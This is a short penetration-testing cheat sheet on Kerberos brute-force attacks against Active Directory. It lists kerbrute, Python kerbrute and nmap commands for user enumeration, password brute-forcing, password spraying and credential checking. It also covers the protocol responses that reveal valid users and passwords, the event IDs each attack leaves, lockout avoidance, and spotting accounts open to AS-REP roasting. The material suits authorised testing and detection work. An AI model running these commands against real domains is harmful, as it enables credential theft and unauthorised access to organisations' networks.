# Brute-force 
Be careful for locking out accounts (error code 4625 & 4771). For kerbrute use `--save` to abort when one account gets lockout.

The python kerbrute also saves the valid TGT for the valid user:password combination.

Can find user accounts with 'UF_DONT_REQUIRE_PREAUTH' set. Can be used for a AS-REP Roasting attack.

## User enumeration
4768 - Kerberos authentication ticket (TGT) was requested
Won't lockout user account. 

`kerbrute userenum --dc <IP> -d <DOMAIN> <USERLIST>`
Returns PRINCIPAL_UNKNOWN for invalid users
Returns PREAUTH_REQUIRED for valid users with pre-auth
Returns a AS-REP for valid users without pre-auth !!!!!!

`python3 kerbrute.py -dc-ip <IP> -domain <DOMAIN> -users <USERLIST>`
`sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>',userdb=<USERLIST> <IP>`

## Password enumeration
4768 - A Kerberos authentication ticket (TGT) was requested
4771 - Kerberos pre-authentication failed

`kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> <USER>`
Returns RESPONSE_TOO_BIG for valid PW with pre-auth
Returns PREAUTH_FAILED for invalid PW with user with pre-auth
Returns a valid AS-REP for valid PW without pre-auth !!!!!!
Returns an invalid AS-REP for invalid PW without pre-auth !!!!!!

`python3 kerbrute.py -dc-ip <IP> -domain <DOMAIN> -user <USER> -passwords <PASSLIST>`

## Password Spraying
4768 - A Kerberos authentication ticket (TGT) was requested
4771 - Kerberos pre-authentication failed

`kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`
`python3 kerbrute.py -dc-ip <IP> -domain <DOMAIN> -users <USERLIST> -password <PASS>`

## Check user:password combo
 4768 - A Kerberos authentication ticket (TGT) was requested
 4771 - Kerberos pre-authentication failed
 
`kerbrute bruteforce --dc <IP> -d <DOMAIN> -v <USERPASSLIST>`
`python3 kerbrute.py -dc-ip <IP> -domain <DOMAIN> -users <USERLIST> -passwords <PASSLIST>`